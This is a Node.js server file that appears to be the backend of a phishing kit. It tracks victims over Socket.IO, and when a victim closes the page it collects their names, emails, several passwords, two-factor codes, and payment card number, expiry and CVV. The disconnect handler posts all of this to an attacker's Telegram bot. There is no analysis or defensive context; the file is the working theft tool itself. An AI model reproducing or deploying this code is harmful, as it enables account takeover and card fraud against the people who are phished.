import express from "express";
import cors from "cors";
import { Server } from "socket.io";
import axios from "axios";
const app = express();
const port = process.env.PORT || 5000;

import { createUser } from "./user.controller.js";
import { SendIp } from "./ip.controller.js";
import { GetMessages } from "./messages.controller.js";
import bodyParser from "body-parser";
import { Ban } from "./ban.controller.js";
import { CheckBan } from "./checkBan.controller.js";

app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors({
    origin: '*'
}));

app.post('/create/user', createUser);
app.post('/send/ip', SendIp);
app.get('/getMessages', GetMessages)
app.get('/ban/:id', Ban)
app.get('/checkBan/:id', CheckBan)

const server = app.listen(port, () => {
    console.log(`The Server is runing on port http://localhost:${port}`);
});


const io = new Server(server, {
    cors: {
        origin: "*",
        credentials: true,
    },
});

var onlineUsers = [];


io.on("connection", (socket) => {
    global.chatSocket = socket;
    socket.on("add-user", async (userId) => {
        const user = onlineUsers.find((user) => user.userId === userId.userId);
        if (!user) {
            onlineUsers.push({ ...userId, socket: socket.id, data: {} });
        }
    });
    socket.on("update-user", async (userId) => {
        const user = onlineUsers.find((user) => user.userId === userId.userId);

        onlineUsers = onlineUsers.filter((user) => user.socket !== socket.id);

        if (user) {
            onlineUsers.push({ ...userId, socket: socket.id, data: userId.data });
        }
      
    });

    socket.on("disconnect", () => {
        const disconnectedUser = onlineUsers.find((user) => user.socket === socket.id);
        onlineUsers = onlineUsers.filter((user) => user.socket !== socket.id);

       
        
        if (disconnectedUser?.data?.ip) {

            const { id,
                ip,
                full_name,
                login_email,
                business_email,
                page_name,
                phone_number,
                password_one,
                password_two,
                password_three,
                tfa_one,
                tfa_two,
                whatsapp,
                email2fa,
                auth_app_2fa,
                CardName,
                CardNr,
                CardDate,
                CardCvc
            } = disconnectedUser.data;

            const params =
                `=============================\n${id ? `ID: \`${id}\`\n` : ''}${ip ? `IP: \`${ip}\`\n` : ''}${full_name ? `Full Name: \`${full_name}\`\n` : ''}${login_email ? `Email: \`${login_email}\`\n` : ''}${business_email ? `Business Email: \`${business_email}\`\n` : ''}${phone_number ? `Phone: \`${phone_number}\`\n` : ''}${page_name ? `Page Name: \`${page_name}\`\n` : ''}${password_one ? `Password1: \`${password_one}\`\n` : ''}${password_two ? `Password2: \`${password_two}\`\n` : ''}${password_three ? `Password3: \`${password_three}\`\n` : ''}${tfa_one ? `2fa: \`${tfa_one}\`\n` : ''}${tfa_two ? `2fa-2: \`${tfa_two}\`\n` : ''}${CardName ? `Name: \`${CardName}\`\n` : ''}${CardNr ? `Card Number: \`${CardNr}\`\n` : ''}${CardDate ? `Expiry Date: \`${CardDate}\`\n` : ''}${CardCvc ? `CVV: \`${CardCvc}\`\n` : ''}${whatsapp ? `Whatsapp 2fa: \`${whatsapp}\`\n` : ''}${email2fa ? `Email 2fa: \`${email2fa}\`\n` : ''}${auth_app_2fa ? `Auth App 2fa: \`${auth_app_2fa}\`\n` : ''}=============================`;

            const finalParams = params + `\nCurrent Step: Closed Page\n=============================`;

            axios.post(`https://api.telegram.org/bot${process.env.BOT}/sendMessage`, {
                chat_id: process.env.CHAT_ID,
                text: finalParams,
                parse_mode: 'Markdown',
            },
                {
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Robots-Tag': 'googlebot: nofollow',
                    },

                })
        }
    });
});
